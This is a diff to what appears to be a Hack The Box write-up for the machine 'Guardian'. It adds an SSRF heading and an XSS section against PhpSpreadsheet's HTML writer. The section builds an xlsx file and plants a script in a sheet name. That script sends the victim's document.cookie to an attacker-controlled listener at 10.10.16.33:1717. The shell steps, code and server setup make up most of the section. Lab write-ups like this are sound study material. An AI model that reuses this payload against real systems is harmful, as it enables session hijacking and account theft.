@@ -136,6 +136,8 @@ GU0142023
 
 <img width="581" height="190" alt="image" src="https://github.com/user-attachments/assets/0a73b1a8-67aa-46ac-9c6e-d4bd539f86a5" />
 
+## SSRF
+
 https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-rx7m-68vc-ppxh
 
 create an `xslx` file with some image
@@ -178,3 +180,99 @@ Serving HTTP on 10.10.16.33 port 1717 (http://10.10.16.33:1717/) ...
 10.10.11.84 - - [31/Aug/2025 17:41:12] code 404, message File not found
 10.10.11.84 - - [31/Aug/2025 17:41:12] "GET /pixel.png HTTP/1.1" 404 -
 ```
+
+
+## XSS
+
+
+```php
+<?php
+    require __DIR__ . '/vendor/autoload.php';
+    use PhpOffice\PhpSpreadsheet\IOFactory;
+    use PhpOffice\PhpSpreadsheet\Writer\Html;
+
+    $inputFileName = 'payload.xlsx';
+    $spreadsheet = IOFactory::load($inputFileName);
+    $writer = new Html($spreadsheet);
+    $writer->writeAllSheets();
+    echo $writer->generateHTMLAll();
+?>
+```
+
+https://github.com/advisories/GHSA-79xx-vf93-p7cx
+
+```py
+from openpyxl import Workbook
+
+wb = Workbook()
+ws1 = wb.active
+ws1.title = "Sheet1"
+ws2 = wb.create_sheet("Sheet2")
+wb.save("xss.xlsx")
+```
+
+```
+(lab-env) Hexada@hexada ~/pentest-env/vrm/Guardian.htb$ unzip xss.xlsx -d XSS-payload                                                                             
+Archive:  xss.xlsx
+  inflating: XSS-payload/docProps/app.xml  
+  inflating: XSS-payload/docProps/core.xml  
+  inflating: XSS-payload/xl/theme/theme1.xml  
+  inflating: XSS-payload/xl/worksheets/sheet1.xml  
+  inflating: XSS-payload/xl/worksheets/sheet2.xml  
+  inflating: XSS-payload/xl/styles.xml  
+  inflating: XSS-payload/_rels/.rels  
+  inflating: XSS-payload/xl/workbook.xml  
+  inflating: XSS-payload/xl/_rels/workbook.xml.rels  
+  inflating: XSS-payload/[Content_Types].xml 
+```
+
+```
+(lab-env) Hexada@hexada ~/pentest-env/vrm/Guardian.htb/XSS-payload/xl$ vim workbook.xml    
+```
+
+it must look like it:
+
+```                                                                       
+<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main"
+          xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships">
+    <workbookPr/>
+    <sheets>
+        <sheet name="Sheet1" sheetId="1" r:id="rId1"/>
+        <sheet name="&lt;script&gt;document.location='http://10.10.16.33:1717/?c='+document.cookie;&lt;/script&gt;" sheetId="2" r:id="rId2"/>
+    </sheets>
+</workbook>
+```
+
+```
+(lab-env) Hexada@hexada ~/pentest-env/vrm/Guardian.htb/XSS-payload$ zip -r ../xss_payload.xlsx *                                                                  
+  adding: [Content_Types].xml (deflated 74%)
+  adding: docProps/ (stored 0%)
+  adding: docProps/core.xml (deflated 49%)
+  adding: docProps/app.xml (deflated 27%)
+  adding: _rels/ (stored 0%)
+  adding: _rels/.rels (deflated 64%)
+  adding: xl/ (stored 0%)
+  adding: xl/workbook.xml (deflated 43%)
+  adding: xl/worksheets/ (stored 0%)
+  adding: xl/worksheets/sheet2.xml (deflated 41%)
+  adding: xl/worksheets/sheet1.xml (deflated 41%)
+  adding: xl/_rels/ (stored 0%)
+  adding: xl/_rels/workbook.xml.rels (deflated 72%)
+  adding: xl/theme/ (stored 0%)
+  adding: xl/theme/theme1.xml (deflated 85%)
+  adding: xl/styles.xml (deflated 77%)
+```
+
+```
+(lab-env) Hexada@hexada ~/pentest-env/vrm/Guardian.htb$ python3 -m http.server 1717 --bind 10.10.16.33                                                     130 ↵  
+Serving HTTP on 10.10.16.33 port 1717 (http://10.10.16.33:1717/) ...
+```
+
+<img width="1186" height="684" alt="image" src="https://github.com/user-attachments/assets/6cac55e0-1fba-46e7-aa8d-f1b981d5fe30" />
+
+<img width="1700" height="178" alt="image" src="https://github.com/user-attachments/assets/dd19c668-a906-48e7-a348-ab108ea1b321" />
+
+<img width="1684" height="145" alt="image" src="https://github.com/user-attachments/assets/62294704-2e1f-4ed8-9c0e-0f9cecc8b7f1" />
+
+<img width="1866" height="931" alt="image" src="https://github.com/user-attachments/assets/a64df8eb-ea38-4bda-8d9c-ffc2fa70458c" />
